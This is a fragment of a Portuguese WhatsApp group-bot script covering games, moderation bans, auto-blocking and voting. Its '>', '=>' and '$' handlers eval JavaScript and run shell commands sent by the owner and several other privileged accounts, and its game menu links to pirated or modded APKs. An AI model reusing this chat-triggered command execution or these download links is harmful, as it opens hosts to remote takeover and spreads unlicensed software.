if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mCOMANDO\x1b[1;37m]', time, color(command), 'do ', color(sender.split('@')[0]))

if (!isGroup && !isCmd && !info.key.fromMe) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mMENSAGEM\x1b[1;37m]', 'do ', color(sender.split('@')[0]))

if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mCOMANDO\x1b[1;37m]', time, color(command), 'do ', color(sender.split('@')[0]), 'no gp: ', color(groupName))

if (!isCmd && isGroup && !info.key.fromMe) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mMENSAGEM\x1b[1;37m]',  'do ', color(sender.split('@')[0]), 'no gp: ', color(groupName))
//======(JOGO-DA-VELHA)=======(Função)===\\

async function joguinhodavelha() {
cdsert(nmrdn_dono2, botNumber, Luix1397)
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = budy.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if (fs.existsSync(`./armor/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if (budy == "Cex") return reply("why");
if (
budy.toLowerCase() == "s" ||
budy.toLowerCase() == "sim" ||
budy.toLowerCase() == "ok"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo já começou antes!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./armor/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
                    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
               
Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
conn.sendMessage(from, {text: chatAccept}, {quoted: info,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net", 
],
},
});
}
} else if (
budy.toLowerCase() == "n" ||
budy.toLowerCase() == "não" ||
budy.toLowerCase() == "no"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo já começou!`);
fs.unlinkSync(`./armor/tictactoe/db/${from}.json`);
 conn.sendMessage(from, {text:
 `@${boardnow.X} *_Infelizmente seu oponente não aceitou o desafio ❌😕_*`}, {quoted: info,
 contextInfo: {
 mentionedJid: [boardnow.X + "@s.whatsapp.net"],
},
}
);
joguinhodavelhajs.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if (arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if (!boardnow.status) return reply(`Parece que seu oponente não aceitou o desafio ainda...`)
if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
     
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(budy), `${from}`);
const matrix = moving._matrix;
if (moving.isWin) {
if (moving.winner == "SERI") {
const chatEqual = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
Jogo termina empatado 😐
`;
reply(chatEqual);
fs.unlinkSync(`./armor/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 4000)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 1) + 10;
const limLoose = Math.floor(Math.random() * 1) + 5;
const chatWon = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
Vencido por @${winnerJID} 😎👑
`;
addLevelingXp(winnerJID + "@s.whatsapp.net", abt)

conn.sendMessage(from, {text: chatWon}, {quoted: info,
contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],
},
});
setTimeout( () => {
if (fs.existsSync("./armor/tictactoe/db/" + from + ".json")) {
 fs.unlinkSync("./armor/tictactoe/db/" + from + ".json");
 reply(`*🕹️JOGO DA VELHA RESETADO...🕹️*`);
 } else {
console.log(color(time, "red"), color("[ ESPIRADO ]", "magenta"), color('Jogo da velha espirado', "red"));
 }
joguinhodavelhajs.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
reply(`_*🥳Parabéns @${winnerJID} Você ganhou "${abt}" em xp por ter ganhado o jogo da velha🎉...*_`)      
fs.unlinkSync(`./armor/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./datab/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
❌ : @${moving.X}
⭕ : @${moving.O}

Sua vez : @${moving.turn == "X" ? moving.X : moving.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
conn.sendMessage(from, {text: chatMove}, {quoted: info,
contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],
},
});
}
} 
} 
}

//=================================\\

async function AntilinkHardF() {
if(isUrl(budy2) && isAntiLinkHard && isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return
linkgpp = await conn.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
if(budy2.includes(`${linkgpp}`)) return 
reply('*Link detectado, porém usuário é admin*')
}

if(isUrl(budy2) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins && !info.key.fromMe) {
if(command == "tiktok" && command == "facebook" && command == "instagram" && command == "tiktok" && command == "twitter" && command == "ytmp3" && command == "ytmp4" && command == "play") return  
linkgpp = await conn.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')  
if(!isUrl(budy2)) return 
if(type === "buttonsResponseMessage") return
if(type === "listResponseMessage") return
reply('*Link detectado, punindo usuário...*')
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
}
} 
AntilinkHardF()
joguinhodavelha()

if(isUrl(body) && isAntilinkgp && isGroup && isBotGroupAdmins) {
if(!isAntilinkgp) return
if(!isUrl(body)) return 
if(budy2.includes("chat.whatsapp.com/")){
if(!budy2.includes("chat.whatsapp.com/")) return
if(isBot) return 
linkgpp = await conn.groupInviteCode(from)
if(budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')  
if(isGroupAdmins) return reply("Você é adm, não removerei você..")
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
}
}
if (budy.match(`bom dia`)) {
 if (mek.key.fromMe) return 
m.reply('bom diaaa.')
}
//========(CONTADOR-DE-MENSAGENS)========\\

const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
pratrp(nmrdn_dono2, botNumber, Luix1397)
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}


//======================================\\

//===============(AUTO-BAN)=============\\
const dbids = []
for(i=0;i<adeuscara.length;++i) {
dbids.push(adeuscara[i].groupId)
}

//======================================\\


//============(EVAL-EXECUÇÕES)===========\\

if (budy.startsWith('>')){
try {
if(info.key.fromMe) return 
if(!SoDono && !isnit && !issupre && !ischyt && !issupre && !ischyt) return
if(budy.includes("keyale") && !isnit) return reply("Fofo você em kkkkk")
console.log('[', color('EVAL', 'silver'),']', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))

return reply(JSON.stringify(eval(budy.slice(2)),null,'\t')) 
} catch (e){
reply(e)
}
}

if(budy.startsWith('=>')){
async function exect() {
if(info.key.fromMe) return   
if (!SoDono && !isnit && !issupre && !ischyt && !issupre && !ischyt) return 
if(budy.includes("keyale") && !isnit) return reply("Fofo você em kkkkk")
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}

reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
}
exect().catch(e => {
reply(String(e))  
})
}


if (body.startsWith('$')) {
if(info.key.fromMe) return 
if(!SoDono && !isnit) return 
if(budy.includes("keyale") && !isnit) return reply("Fofo você em kkkkk")
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

//======================================\\


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return  
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return  
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return  
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

// ANTI NOTAS FAKES ======================>

if(isAntiNotas && budy2.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotGroupAdmins && !isGroupAdmins && !SoDono) {
let verificar = budy2.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)
if (verificar && budy.length < 100) return  
await conn.sendMessage(from, {text: '*Mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//FINALZIN ==============================>


//======(ANTI-VIDEO)========\\
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return conn.sendMessage(from,{text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, porém é admin logo a punição será anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}
//=======================================\\

if ((isAntiPorn && isBotGroupAdmins)) {
if (type === 'imageMessage') {
buff = await getFileBuffer(info.message.imageMessage, 'image')
ran = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
fs.writeFileSync(ran, buff)
res = await upload(buff)
anu = await fetchJson(`https://nsfw-demo.sashido.io/api/image/classify?url=${res}`)
fs.unlinkSync(ran, buff)
if(anu[0].className === 'Porn' && anu[0].probability >= '0.723584315776825' && isGroupAdmins)  {
await conn.sendMessage(from,{text: `Você é adm, não banirei você por isto..`}, {quoted: info})
fs.unlinkSync(ran, buff)
return
} else if(anu[0].className === 'Sexy' && anu[0].probability >= '0.28157779574394226' && !isGroupAdmins) {
await conn.sendMessage(from,{text: `hummm`}, {quoted: info})
fs.unlinkSync(ran, buff)
return
}
if(anu[0].className === 'Hentai' && isGroupAdmins) {
await conn.sendMessage(from,{text: `Você é adm, não banirei você...`},{quoted: info})
fs.unlinkSync(ran, buff)
return
}  else if(anu[0].className === 'Hentai' && !isGroupAdmins) {
await conn.sendMessage(from,{text: `PORNO DETECTADO, VOCÊ SERÁ BANIDO..`}, {quoted: info})
setTimeout(async function () {
if(!JSON.stringify(groupMembers).includes(sender)) return  
conn.groupParticipantsUpdate(from, [sender], 'remove')
fs.unlinkSync(ran, buff)
}, 2000)
return
}
}
}

//========(ANTI-PV-QUE-BLOQUEIA)======\\
if(isAntiPv && !isGroup && !SoDono && !isnit && !isPremium){ 
msgpvblock = `./func/call/msg_block-${sender}.json`
fs.writeFileSync(msgpvblock, JSON.stringify("⚠️ *Opa meu parceiro como tu vai bom Bom voce nao alugou esse bot\n*alugue com:*${NickDono}\nnumerodele: wa.me/5516997357601\n\n\n *voce sera bloqueado automaticamente* ⚠️", null, 2))
msgmsglbl = JSON.parse(fs.readFileSync(msgpvblock))
reply(msgmsglbl)
fs.unlinkSync(msgpvblock)
setTimeout(async () => {
conn.updateBlockStatus(sender, 'block')
}, 2000)
return
}
//======================================\\


//=========(ANTIPV-QUE-SÓ-FALA)==========\\

if(!isGroup && !isPremium && !SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe && banChats === true) return reply(`『👻』❀֟፝֟͜͜͡͡͡𝄞⃟𝐕𝐎𝐂𝐄 𝐍𝐀𝐎 𝐓𝐄𝐌 𝐏𝐄𝐑𝐌𝐈𝐒𝐒Ã𝐎 𝐏𝐀𝐑𝐀 𝐔𝐒𝐀𝐑 𝐎 𝐁𝐎𝐓 𝐒𝐎𝐑𝐑𝐘`)
const atibot = info.isBaileys
if (atibot === true) return 


//======================================\\

// ANTI_LIGAR \\

if(!isGroup && isAnticall) {
conn.ws.on('CB:call', async (B) => {
var msgcallblock = `./func/call/msg_block-${sender}.json`  
if(!fs.existsSync(msgcallblock)) {
fs.writeFileSync(msgcallblock, JSON.stringify("_- PROGRAMAÇÃO DE - _\n\n BLOQUEAR / USUARIOS POR EFETUAR LIGAÇÃO PARA O BOT\n\n_- REALIZANDO AÇÃO _-", null, 2))
var msgcallbl = JSON.parse(fs.readFileSync(msgcallblock))
if (B.content[0].tag == 'offer') {
conn.sendMessage(B.content[0].attrs['call-creator'], { text: msgcallbl }).then(() => { 
conn.updateBlockStatus(B.content[0].attrs['call-creator'], "block")
fs.unlinkSync(msgcallblock)
})
}
}
})
}

//==SISTEMA DE VOTAÇÃO: CRÉDITOS: KAUAN==\\
if(isGroup) {
cdsert(nmrdn_dono2, botNumber, Luix1397)  
if (budy.toLowerCase() === 'voto'){
let vote = JSON.parse(fs.readFileSync(`./armor/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./armor/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '0@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' não é possivel votar duas vezes', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./armor/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*para*: ${_votes[0].reason}\n*total Votos* : ${vote.length} Votos\n*Duração* : ${_votes[0].durasi} minutos\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
        }  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devoto'){
const vote = JSON.parse(fs.readFileSync(`./armor/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./armor/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '0@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' não é possivel anular um voto', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./armor/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*para*: ${_votes[0].reason}\n*total Votos* : ${vote.length} Vote\n*duração* : ${_votes[0].durasi} minutos\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	
//======================================\\

//_CONTAGEM DE COMANDOS
if (isCmd) cmdadd()
            
if (isBanned) return
BannedExpired(ban)

if (isCmd && !SoDono && !isnit && !type === "buttonsResponseMessage" && !type === "listResponseMessage") addFilter(sender)

//INICIO DE COMANDO DE PREFIXO
switch(command){

//=========(-MENUS-DE-CMDS-)========\\

case 'download-link':
if(q.includes("video") || q.includes("mp4")) {
conn.sendMessage(from, {video: {url: q}, mimetype: 'video/mp4'}, {quoted: info}).catch(e => {
reply("Error, visualize se este link é válido...")
})
} else if(q.includes("webp") || q.includes("jpg")) {
conn.sendMessage(from, {image: {url: q}}, {quoted: info}).catch(e => {
reply("Error, visualize se este link é válido...")
})
}
break
case 'listajogos': {
sections = [
{title: "",
rows: [
{title: "✰ۜۜ͜͡𝐌𝐈𝐍𝐄𝐂𝐑𝐀𝐅𝐓 𝟏.𝟏𝟔.𝟐𝟐𝟏.𝟎𝟏🎳", rowId: `${prefix}jogo1`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐑𝐀𝐆𝐎𝐍 𝐁𝐀𝐋𝐋 𝐙 - 𝐃𝐎𝐊𝐊𝐀𝐍🎳", rowId: `${prefix}jogo2`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐓𝐀 𝐒𝐀𝐍 𝐀𝐍𝐃𝐑𝐄𝐀𝐒 𝐎𝐅𝐂🎳", rowId: `${prefix}jogo3`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡️𝐆𝐓𝐀 𝐒𝐀 𝐋𝐄𝐆𝐄𝐍𝐃𝐀𝐃𝐎 𝐄𝐌 𝐏𝐓/𝐁𝐑🎳", rowId: `${prefix}jogo4`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐓𝐀 𝐒𝐀 𝐂𝐎𝐌 𝐌𝐎𝐃 𝐂𝐋𝐄𝐎🎳", rowId: `${prefix}jogo5`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐓𝐀 𝐒𝐀 𝐎𝐍𝐋𝐈𝐍𝐄🎳", rowId: `${prefix}jogo6`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐆𝐓𝐀 𝐒𝐔𝐏𝐄𝐑 𝐋𝐈𝐓𝐄 + 𝐌𝐎𝐃 𝐂𝐋𝐄𝐎🎳", rowId: `${prefix}jogo7`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐀𝐒𝐓 𝐃𝐀𝐘 𝐎𝐍 𝐄𝐀𝐑𝐓 𝐒𝐔𝐑𝐕𝐈𝐕𝐀𝐋🎳", rowId: `${prefix}jogo8`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐁𝐎𝐌𝐁𝐄𝐑 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐌𝐎𝐃🎳", rowId: `${prefix}jogo9`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐑𝐂𝐀𝐃𝐄 𝐇𝐔𝐍𝐓𝐄𝐑🎳", rowId: `${prefix}jogo10`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐃𝐄𝐅𝐄𝐒𝐀 𝐃𝐄 𝐙𝐎𝐌𝐁𝐈𝐄 𝐎𝐂𝐈𝐎𝐒𝐎🎳", rowId: `${prefix}jogo11`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐀𝐂-𝐌𝐀𝐍🎳", rowId: `${prefix}jogo12`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐀𝐑 𝐃𝐑𝐈𝐕𝐈𝐍𝐆 𝐒𝐂𝐇𝐎𝐎𝐋 𝐒𝐈𝐌𝐔𝐋𝐀𝐓𝐎𝐑🎳", rowId: `${prefix}jogo13`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐂𝐘𝐁𝐄𝐑 𝐅𝐈𝐆𝐇𝐓𝐄𝐑𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌🎳", rowId: `${prefix}jogo14`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐑𝐀𝐆 𝐑𝐀𝐂𝐈𝐍𝐆🎳", rowId: `${prefix}jogo15`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐑. 𝐁𝐑𝐎𝐖🎳", rowId: `${prefix}jogo16`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐀𝐈𝐑𝐏𝐎𝐑𝐓 𝐂𝐈𝐓𝐘🎳", rowId: `${prefix}jogo17`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐑𝐀𝐒𝐇 𝐁𝐀𝐍𝐃𝐈𝐂𝐎𝐎𝐓🎳", rowId: `${prefix}Jogo18`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐄𝐀𝐋 𝐒𝐓𝐄𝐄𝐋 𝐖𝐎𝐑𝐋𝐃 𝐑𝐎𝐁𝐎𝐓 𝐁𝐎𝐗𝐈𝐍𝐆🎳", rowId: `${prefix}jogo19`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐀𝐍𝐆𝐄𝐑 𝐎𝐅 𝐒𝐓𝐈𝐂𝐊𝐄𝐑🎳", rowId: `${prefix}jogo20`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐍𝐆𝐑𝐘 𝐁𝐈𝐑𝐃𝐒 𝟐🎳", rowId: `${prefix}jogo21`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐅𝐎𝐑𝐂𝐄 𝐆𝐑𝐎𝐔𝐏 𝟐 (𝐂𝐒)🎳", rowId: `${prefix}jogo22`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐑𝐎𝐁𝐋𝐎𝐗🎳", rowId: `${prefix}jogo23`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐒 𝐒𝐓𝐑𝐈𝐊𝐄𝐑🎳", rowId: `${prefix}jogo24`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐃𝐑𝐄𝐀𝐌 𝐋𝐄𝐀𝐆𝐔𝐄 𝐒𝐎𝐂𝐂𝐄𝐑🎳", rowId: `${prefix}jogo25`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐋𝐀𝐒𝐇 𝐎𝐅 𝐂𝐋𝐀𝐍𝐒🎳", rowId: `${prefix}jogo26`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐂𝐑𝐈𝐌𝐈𝐍𝐀𝐋 𝐂𝐀𝐒𝐄 𝐏𝐀𝐑𝐈𝐒🎳", rowId: `${prefix}jogo27`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐃𝐑𝐈𝐅𝐓 𝐌𝐀𝐗 𝐖𝐎𝐑𝐋𝐃🎳", rowId: `${prefix}jogo28`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐃𝐎𝐖𝐍𝐇𝐈𝐋𝐋 𝐌𝐀𝐒𝐓𝐄𝐑𝐒🎳", rowId: `${prefix}jogo29`, description: `${NomeDoBot}`},
{title: "️✰ۜۜ͜͡𝐌𝐎𝐍𝐎𝐏𝐎𝐋𝐘🎳", rowId: `${prefix}jogo30`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `͞ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐉𝐎𝐆𝐎𝐒ꫂ `,
  buttonText: "⚜️𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑⚜️️",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'jogo1':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Minecraft:* https://www.mediafire.com/file/w9sms627ql2np6i/Minecraft_1.16.221.01_ByHT.apk/file
`)
break
case 'jogo2':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *DragonBall Z - Dokkan:* https://www.mediafire.com/file/015ibjiljfkv7uo/Dokkan_v4_12_1_MOD.apk/file
`)
break
case 'jogo3':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *GTA SanAndreas:* https://www.mediafire.com/file/ln6r3kx0ie77r9t/GTA_San_Andreas_2021.zip/file
`)
break
case 'jogo4':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *GTA SA - Legendado em Português:* http://www.mediafire.com/file/7op13aup1ll7m9y/GTA_SA_COM_TRADU%25C3%2587%25C3%2583O_PT-BR.zip/file
`)
break
case 'jogo5':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *GTA SA com Mod Cleo:* http://www.mediafire.com/file/d8cfwzctx95x0dx/GTA_SA_v2.00_Mod_Cleo.zip/file
`)
break
case 'jogo6':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *GTA SA Online:* https://www.mediafire.com/file/0xccd5m0zwqstag/GTA_SA_ONLINE_SAMP_ByHT.zip/file
`)
break
case 'gpsamp':
await reply(`Olá ${pushname}, aqui está o seu o grupo, espero que você goste!
🔥 *Grupo Ofc:* https://chat.whatsapp.com/JDEH0eU70z2LLU4FywshzY
`)
break
case 'discord':
await reply(`Olá ${pushname}, aqui está o seu o nosso discord, espero que você goste!
🔥 *Discord Ofc:* https://discord.gg/wwUPDy89
`)
break
